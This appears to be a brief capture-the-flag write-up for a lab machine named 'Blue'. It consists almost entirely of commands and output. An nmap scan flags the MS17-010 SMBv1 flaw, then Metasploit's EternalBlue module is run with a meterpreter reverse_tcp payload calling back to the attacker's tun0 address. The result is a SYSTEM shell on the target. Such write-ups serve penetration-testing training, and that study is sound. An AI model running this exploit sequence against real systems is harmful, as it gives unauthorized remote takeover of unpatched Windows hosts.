# Blue
## Recon
```
# nmap -p 445 --script "vuln and safe" -Pn -n 10.10.10.40 -oA blue.vuln_and_safe.nmap
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
```
## Exploit
```
# msfconsole
msf > search ms17-010                                                                              
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > set lhost tun0
msf exploit(windows/smb/ms17_010_eternalblue) > set rhost 10.10.10.40
msf exploit(windows/smb/ms17_010_eternalblue) > exploit -j
msf > sessions -i 1

meterpreter > shell
C:\Windows\system32>whoami
nt authority\system
```